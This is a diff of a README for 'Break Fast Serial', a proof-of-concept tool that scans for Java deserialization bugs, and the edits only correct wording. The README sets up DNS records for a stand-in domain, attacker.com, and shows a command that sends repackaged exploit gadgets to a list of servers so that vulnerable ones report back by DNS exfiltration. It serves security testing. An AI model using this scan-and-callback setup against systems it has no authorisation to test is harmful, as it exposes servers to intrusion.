@@ -1,14 +1,14 @@
 # Break Fast Serial
 
-Proof of concept that demonstrate asynchronous scan of deserialization bugs. It repackage [well knonw exploits](https://github.com/breenmachine/JavaUnserializeExploits) with modified gadget to trigger DNS query.
+A proof of concept that demonstrates asynchronous scanning of deserialization bugs. It repackages [well known exploits](https://github.com/breenmachine/JavaUnserializeExploits) with a modified gadget that triggers DNS queries.
 
-Detailed explaination : http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/
+Detailed explanation: http://gosecure.net/2017/03/22/detecting-deserialization-bugs-with-dns-exfiltration/
 
 ## DNS Chef configuration
 
 The DNS Chef instance is a requirement to see the results of the scan.
 
-This is the typical DNS configuration expected on your domain registrar. It will signify to other DNS server that all subdomain of `attacker.com` must be resolve by the DNS server host at `10.11.12.13`
+This is the typical DNS configuration expected on your domain registrar. It will signify to other DNS servers that all subdomains of `attacker.com` must be resolved by the DNS server host at `10.11.12.13`.
 ```
 NS scanner.attacker.com dnschef.attacker.com
 A dnschef.attacker.com 10.11.12.13
@@ -17,7 +17,7 @@ A dnschef.attacker.com 10.11.12.13
  - `10.11.12.13` : The public IP address that is 
  - `attacker.com` : A domain name you own
 
-It is highly recommended to use this [modify version of DNS Chef](./dnschef) that decoded the metadata placed by the scanner.
+It is highly recommended to use this [modified version of DNS Chef](./dnschef) that decodes the metadata placed by the scanner.
 
 ## Single IP scan
 
@@ -56,7 +56,7 @@ cat list_servers.txt | python breakfast.py -stdin -d scanner.attacker.com
 
 ## Expected response
 
-If the vulnerability is confirmed, the expected trace from DNS Chef is as follow.
+If the vulnerability is confirmed, the expected trace from DNS Chef is as follows.
 
 ```
 ['843', 'jboss', '192.168.40.24', '8181']
